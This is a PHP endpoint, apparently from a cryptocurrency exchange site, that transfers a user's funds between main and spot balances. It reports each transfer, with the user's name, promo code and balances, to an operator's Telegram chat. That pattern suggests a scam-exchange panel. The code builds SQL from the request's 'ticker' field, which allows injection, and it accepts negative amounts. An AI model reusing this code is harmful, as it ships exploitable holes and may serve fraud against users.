<?php
error_reporting(0);
session_start();
include '_config.php';
$inputJSON = file_get_contents('php://input');
$_POST = json_decode( $inputJSON, TRUE );
date_default_timezone_set('UTC');
$current_time_ms = round(microtime(true) * 1000);
$time_trans = date("Y-m-d H:i:s", floor($current_time_ms / 1000));
$time_trans = strtotime($time_trans);
if(isset($_SESSION['uuid'])) {

    $amount = guardText($_POST['amount']);
    $type = guardText($_POST['balance_type']);
    $ticker = guardText($_POST['ticker']);

    if($amount == 0){
        echo '{"success":false,"message":"The amount must be greater than 0."}';
        exit();
    }

    if($type == 1) {

        if ($stmt = $dbB->prepare('SELECT * FROM ' . $ticker)) {
            $result = $stmt->execute();
            while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
                if ($arr['uuid'] == $_SESSION['uuid']) {
                    $name = $arr['name'];
                    $balance = $arr['balance'];
                    $spot_balance = $arr['spot_balance'];
                    $order_balance = $arr['order_balance'];
                    $total_balance = $arr['total_balance'];
                }
            }
        }

        if($amount > $balance){
            echo '{"success":false,"message":"Error balance."}';
            exit();
        }

        $balance = $balance - $amount;
        $spot_balance = $spot_balance + $amount;

        $dbB->query('UPDATE ' . $ticker . ' SET spot_balance = ' . $spot_balance . ',balance = ' . $balance . ' WHERE uuid="' . $_SESSION['uuid'] . '";');


        if(!isset($USER_PROMO['promo'])){
            $USER_PROMO['promo'] = 'Не введен';
        }

        $message = "♻️ [SPOT]

Пользователь: {$USER['name']}
Промокод: {$USER_PROMO['promo']}
Баланс: {$balance} {$ticker} 
Spot баланс: {$spot_balance} {$ticker} 

UUID: {$USER['uuid']}
";
        sendTelegramMessage($chat_id, $message, $bot_token);

        echo '{"success":true,"message":"Transfer completed successfully.","data":{"ticker":"'.$ticker.'","balance":"'.$balance.'","trade_balance":"'.$spot_balance.'","order_balance":"'.$order_balance.'","total_balance":"'.$total_balance.'"}}';
        exit();
    }elseif($type == 0) {

        if ($stmt = $dbB->prepare('SELECT * FROM ' . $ticker)) {
            $result = $stmt->execute();
            while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
                if ($arr['uuid'] == $_SESSION['uuid']) {
                    $name = $arr['name'];
                    $balance = $arr['balance'];
                    $spot_balance = $arr['spot_balance'];
                    $order_balance = $arr['order_balance'];
                    $total_balance = $arr['total_balance'];
                }
            }
        }

        if($amount > $spot_balance){
            echo '{"success":false,"message":"Error balance."}';
            exit();
        }

        $balance = $balance + $amount;
        $spot_balance = $spot_balance - $amount;

        $dbB->query('UPDATE ' . $ticker . ' SET spot_balance = ' . $spot_balance . ',balance = ' . $balance . ' WHERE uuid="' . $_SESSION['uuid'] . '";');

        $message = "♻️ [SPOT]

Пользователь: {$USER['name']}
Промокод: {$USER_PROMO['promo']}
Баланс: {$balance} {$ticker} 
Spot баланс: {$spot_balance} {$ticker} 
UUID: {$USER['uuid']}
";
        sendTelegramMessage($chat_id, $message, $bot_token);

        echo '{"success":true,"message":"Transfer completed successfully.","data":{"ticker":"'.$ticker.'","balance":"'.$balance.'","trade_balance":"'.$spot_balance.'","order_balance":"'.$order_balance.'","total_balance":"'.$total_balance.'"}}';
        exit();
    }
}
?>